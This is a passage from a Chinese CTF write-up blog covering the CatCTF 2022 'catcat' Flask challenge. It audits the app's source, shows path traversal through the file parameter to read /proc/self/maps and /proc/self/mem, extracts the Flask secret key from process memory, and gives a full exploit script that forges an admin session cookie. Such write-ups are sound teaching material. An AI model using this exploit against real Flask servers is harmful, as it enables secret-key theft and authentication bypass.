class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;NoNoNo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">5637</span>)</span><br></pre></td></tr></table></figure>

<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>从源码可知Python3程序，使用了Flask框架</p>
<h4 id="审计app-py"><a href="#审计app-py" class="headerlink" title="审计app.py"></a><a target="_blank" rel="noopener" href="http://审计app.py/" title="审计app.py">审计app.py</a></h4><h4 id="flag部分"><a href="#flag部分" class="headerlink" title="flag部分"></a>flag部分</h4><p>首先关注含有flag的部分，以下代码可知程序一启动就读取并删除flag文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line"> flag = cat(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"> os.remove(<span class="string">&quot;/flag&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>关注到admin路由可以获取flag，但是需要完成session伪造</p>
<p>需要伪造内容为<code>&#123;&quot;admin&quot; : 1&#125;</code>的session，则需要获取secret key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_can_list_root</span>():</span><br><span class="line"> <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">return</span> flag</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line">   session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;NoNoNo&quot;</span></span><br></pre></td></tr></table></figure>

<p>secret key部分如下，是生成一个uuid然后去除<code>-</code>再拼接<code>*abcdefgh</code>组成的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="文件读取部分"><a href="#文件读取部分" class="headerlink" title="文件读取部分"></a>文件读取部分</h4><p>可以看到任意文件读取功能是info路由提供的，</p>
<p>注意到可控参数有三个，分别是file，start和end</p>
<p>还注意到其中有个cat函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line"> filename = <span class="string">&quot;./details/&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"> start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).index(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end))</span><br></pre></td></tr></table></figure>

<p>分析源码可知cat函数由cat.py提供</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cat <span class="keyword">import</span> cat</span><br></pre></td></tr></table></figure>

<h4 id="审计cat-py"><a href="#审计cat-py" class="headerlink" title="审计cat.py"></a><a target="_blank" rel="noopener" href="http://审计cat.py/" title="审计cat.py">审计cat.py</a></h4><p>使用同样的方法读取cat.py的源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, getopt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">filename, start=<span class="number">0</span>, end=<span class="number">0</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start = <span class="built_in">int</span>(start)</span><br><span class="line">        end = <span class="built_in">int</span>(end)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> filename != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> os.access(filename, os.R_OK):</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> start &gt;= <span class="number">0</span>:</span><br><span class="line">            f.seek(start)</span><br><span class="line">            <span class="keyword">if</span> end &gt;= start <span class="keyword">and</span> end != <span class="number">0</span>:</span><br><span class="line">                data = f.read(end-start)</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data = f.read()</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line">            </span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = (<span class="string">&quot;File `%s` not exist or can not be read&quot;</span> % filename).encode()</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    opts,args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">&#x27;-h-f:-s:-e:&#x27;</span>,[<span class="string">&#x27;help&#x27;</span>,<span class="string">&#x27;file=&#x27;</span>,<span class="string">&#x27;start=&#x27;</span>,<span class="string">&#x27;end=&#x27;</span>])</span><br><span class="line">    fileName = <span class="string">&quot;&quot;</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> opt_name, opt_value <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt_name == <span class="string">&#x27;-h&#x27;</span> <span class="keyword">or</span> opt_name == <span class="string">&#x27;--help&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Help&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-f --file   File name&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-s --start   Start position&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-e --end   End position&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Example of reading /etc/passwd&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;python3 cat.py -f /etc/passwd&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;python3 cat.py --file /etc/passwd&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;python3 cat.py -f /etc/passwd -s 1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;python3 cat.py -f /etc/passwd -e 5&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;python3 cat.py -f /etc/passwd -s 1 -e 5&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> opt_name == <span class="string">&#x27;-f&#x27;</span> <span class="keyword">or</span> opt_name == <span class="string">&#x27;--file&#x27;</span>:</span><br><span class="line">            fileName = opt_value</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">elif</span> opt_name == <span class="string">&#x27;-s&#x27;</span> <span class="keyword">or</span> opt_name == <span class="string">&#x27;--start&#x27;</span>:</span><br><span class="line">            start = opt_value</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">elif</span> opt_name == <span class="string">&#x27;-e&#x27;</span> <span class="keyword">or</span> opt_name == <span class="string">&#x27;--end&#x27;</span>:</span><br><span class="line">            end = opt_value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> fileName != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(cat(fileName, start, end)) </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No file to read&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="文件读取功能"><a href="#文件读取功能" class="headerlink" title="文件读取功能"></a>文件读取功能</h4><p>cat.py功能比较简单，整段源码最重要的部分如下</p>
<p>下面代码的作用是读取文件并以bytes返回，观察可知可以设定读取位置（start、end）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">filename, start=<span class="number">0</span>, end=<span class="number">0</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start = <span class="built_in">int</span>(start)</span><br><span class="line">        end = <span class="built_in">int</span>(end)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> filename != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> os.access(filename, os.R_OK):</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> start &gt;= <span class="number">0</span>:</span><br><span class="line">            f.seek(start)</span><br><span class="line">            <span class="keyword">if</span> end &gt;= start <span class="keyword">and</span> end != <span class="number">0</span>:</span><br><span class="line">                data = f.read(end-start)</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data = f.read()</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line">            </span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = (<span class="string">&quot;File `%s` not exist or can not be read&quot;</span> % filename).encode()</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>

<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>使用方法如下</p>
<p>例如新建一个a.txt，内容如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefg</span><br></pre></td></tr></table></figure>

<p>使用app.py读取a.txt，从第1个位置开始到第3个位置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cat.py -s 1 -e 3 -f a.txt</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE8_iR0nB5T-O1.png" class="">

<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>这题的关键点就是伪造session，从而访问admin路由获取flag</p>
<p>但伪造session需要获取secret key</p>
<h4 id="获取secret-key"><a href="#获取secret-key" class="headerlink" title="获取secret key"></a>获取secret key</h4><p>这里可以利用python存储对象的位置在堆上这个特性，</p>
<p>app是实例化的Flask对象，而secret key在<code>app.config[&#39;SECRET_KEY&#39;]</code>，</p>
<p>所以可以通过读取&#x2F;proc&#x2F;self&#x2F;mem来读取secret key</p>
<h4 id="读取堆栈分布"><a href="#读取堆栈分布" class="headerlink" title="读取堆栈分布"></a>读取堆栈分布</h4><p>由于&#x2F;proc&#x2F;self&#x2F;mem内容较多而且存在不可读写部分，直接读取会导致程序崩溃，</p>
<p>所以先读取&#x2F;proc&#x2F;self&#x2F;maps获取堆栈分布</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">map_list = requests.get(url + <span class="string">f&quot;info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)</span><br><span class="line">map_list = map_list.text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map_list:</span><br><span class="line">    map_addr = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> map_addr:</span><br><span class="line">        start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found rw addr:&quot;</span>, start, <span class="string">&quot;-&quot;</span>, end)</span><br></pre></td></tr></table></figure>

<h4 id="读取对应位置内存数据"><a href="#读取对应位置内存数据" class="headerlink" title="读取对应位置内存数据"></a>读取对应位置内存数据</h4><p>然后读取&#x2F;proc&#x2F;self&#x2F;mem，读取对应位置的内存数据，</p>
<p>再使用正则表达式查找内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;*abcdefgh&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">   secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)</span><br><span class="line">      <span class="keyword">if</span> secret_key:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret Key:&quot;</span>, secret_key[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h4 id="伪造session"><a href="#伪造session" class="headerlink" title="伪造session"></a>伪造session</h4><p>session伪造可以利用如下<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager" title="项目">项目</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/noraj/flask-session-cookie-manager</span><br></pre></td></tr></table></figure>

<h4 id="一键获取flag"><a href="#一键获取flag" class="headerlink" title="一键获取flag"></a>一键获取flag</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment">#----------------------------------</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="comment">#Edited by lx56@blog.lxscloud.top</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="comment">#----------------------------------</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ast, sys</span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABC</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此程序只能运行于Python3以上</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------session 伪造----------------</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret_key = secret_key</span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="comment">#-------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key</span></span><br><span class="line">s_key = <span class="string">&quot;&quot;</span></span><br><span class="line">bypass = <span class="string">&quot;../..&quot;</span></span><br><span class="line"><span class="comment">#请求file路由进行读取</span></span><br><span class="line">map_list = requests.get(url + <span class="string">f&quot;info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)</span><br><span class="line">map_list = map_list.text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map_list:</span><br><span class="line">    <span class="comment">#匹配指定格式的地址</span></span><br><span class="line">    map_addr = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> map_addr:</span><br><span class="line">        start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found rw addr:&quot;</span>, start, <span class="string">&quot;-&quot;</span>, end)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#设置起始和结束位置并读取/proc/self/mem</span></span><br><span class="line">        res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment">#如果发现*abcdefgh存在其中，说明成功泄露secretkey</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;*abcdefgh&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment">#正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh</span></span><br><span class="line">            secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> secret_key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Secret Key:&quot;</span>, secret_key[<span class="number">0</span>])</span><br><span class="line">                s_key = secret_key[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置session中admin的值为1</span></span><br><span class="line">data = <span class="string">&#x27;&#123;&quot;admin&quot;:1&#125;&#x27;</span></span><br><span class="line"><span class="comment">#伪造session</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;session=&quot;</span> + FSCM.encode(s_key, data)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#请求admin路由</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = requests.get(url + <span class="string">&quot;admin&quot;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag is&quot;</span>, flag.text)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something error&quot;</span>)</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/getflag_njEw5pkT4W.png" class="">

<h4 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h4><p>提供docker-compose等文件：<a target="_blank" rel="noopener" href="https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/cat_cat.zip" title="https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/cat_cat.zip">https://blog.lxscloud.top/static/post/CTF_Python_Flask&#x2F;catcat&#x2F;cat_cat.zip</a></p>
<p>若师傅想要直接复现可以到我的CTF平台：<a target="_blank" rel="noopener" href="https://ctfm.lxscloud.top/category/test/challenge/13" title="https://ctfm.lxscloud.top/category/test/challenge/13">https://ctfm.lxscloud.top/category/test/challenge/13</a></p>
<p>同时提供exp文件下载（Python3.6以上）：<a target="_blank" rel="noopener" href="https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/getFlag.py" title="https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/getFlag.py">https://blog.lxscloud.top/static/post/CTF_Python_Flask&#x2F;catcat&#x2F;getFlag.py</a></p>
<h3 id="ez-bypass🍥"><a href="#ez-bypass🍥" class="headerlink" title="ez_bypass🍥"></a>ez_bypass🍥</h3><p>简单的 bypass filter</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/ezbypassFlag_m2yqdH2WPI.png" class="">

<h3 id="ez-curl🔗"><a href="#ez-curl🔗" class="headerlink" title="ez_curl🔗"></a>ez_curl🔗</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 